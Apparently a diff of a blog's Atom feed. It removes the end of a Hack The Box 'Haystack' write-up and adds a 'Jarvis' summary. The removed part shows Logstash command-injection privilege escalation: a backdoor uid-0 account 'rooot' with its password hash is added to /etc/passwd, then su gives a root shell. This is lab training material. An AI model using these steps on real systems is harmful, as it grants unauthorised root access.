-&lt;p&gt;&lt;br /&gt;Then I created the input file and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;logstash_pwned&lt;/code&gt;, it will simply execute &lt;code class=&quot;highlighter-rouge&quot;&gt;root.sh&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.2$ echo 'Ejecutar comando : sh /dev/shm/root.sh' &amp;gt; /opt/kibana/logstash_pwned
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;After 2 minutes approximately the command got executed and &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; was modified:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.2$ cat /etc/passwd
-root:x:0:0:root:/root:/bin/bash
-bin:x:1:1:bin:/bin:/sbin/nologin
-daemon:x:2:2:daemon:/sbin:/sbin/nologin
-adm:x:3:4:adm:/var/adm:/sbin/nologin
-lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
-sync:x:5:0:sync:/sbin:/bin/sync
-shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
-halt:x:7:0:halt:/sbin:/sbin/halt
-mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
-operator:x:11:0:operator:/root:/sbin/nologin
-games:x:12:100:games:/usr/games:/sbin/nologin
-ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
-nobody:x:99:99:Nobody:/:/sbin/nologin
-systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
-dbus:x:81:81:System message bus:/:/sbin/nologin
-polkitd:x:999:998:User for polkitd:/:/sbin/nologin
-sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
-postfix:x:89:89::/var/spool/postfix:/sbin/nologin
-chrony:x:998:996::/var/lib/chrony:/sbin/nologin
-security:x:1000:1000:security:/home/security:/bin/bash
-elasticsearch:x:997:995:elasticsearch user:/nonexistent:/sbin/nologin
-logstash:x:996:994:logstash:/usr/share/logstash:/sbin/nologin
-nginx:x:995:993:Nginx web server:/var/lib/nginx:/sbin/nologin
-kibana:x:994:992:kibana service user:/home/kibana:/sbin/nologin
-rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash
-bash-4.2$ su rooot
-Contraseña:
-[root@haystack kibana]# whoami
-root
-[root@haystack kibana]# id
-uid=0(root) gid=0(root) grupos=0(root) contexto=system_u:system_r:unconfined_service_t:s0
-[root@haystack kibana]#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/haystack/5.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;&lt;br /&gt;And we owned root !
-&lt;br /&gt;That’s it , Feedback is appreciated !
-&lt;br /&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;
-&lt;br /&gt;Thanks for reading.
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/safe/&quot;&gt;Hack The Box - Safe&lt;/a&gt;
-&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/jarvis/&quot;&gt;Hack The Box - Jarvis&lt;/a&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="ssh" /><category term="steganography" /><category term="elasticsearch" /><category term="kibana" /><category term="logstash" /><category term="js" /><summary type="html">Quick Summary Hey guys, today Haystack retired and here’s my write-up about it. It was an easy fun box and I liked the privilege escalation part. It’s a Linux box and its ip is 10.10.10.115, I added it to /etc/hosts as haystack.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/haystack# nmap -sV -sT -sC -o nmapinitial haystack.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-01 17:33 EET Nmap scan report for haystack.htb (10.10.10.115) Host is up (0.59s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA) | 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA) |_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519) 80/tcp open http nginx 1.12.2 |http-server-header: nginx/1.12.2 |_http-title: Site doesn’t have a title (text/html). 9200/tcp open http nginx 1.12.2 | http-methods: | Potentially risky methods: DELETE |_http-server-header: nginx/1.12.2 |_http-title: Site doesn’t have a title (application/json; charset=UTF-8).</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/haystack/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="sqli" /><category term="rce" /><category term="php" /><category term="python" /><category term="suid" /><summary type="html">Quick Summary Hey guys, today Jarvis retired and here’s my write-up about it. It was a nice easy box with a web application vulnerable to SQL injection, a python script vulnerable to command injection and a setuid binary that could be abused to get a root shell. It’s a medium box and its ip is 10.10.10.143, I added it to /etc/hosts as jarvis.htb. Let’s jump right in! Nmap As always we will start with nmap to scan for open ports and services: ``` root@kali:~/Desktop/HTB/boxes/jarvis# nmap -sV -sT -sC -o nmapinitial jarvis.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-08 17:33 EET Nmap scan report for jarvis.htb (10.10.10.143) Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA) | 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA) |_ 256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Stark Hotel Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/jarvis/0.png" /></entry></feed>
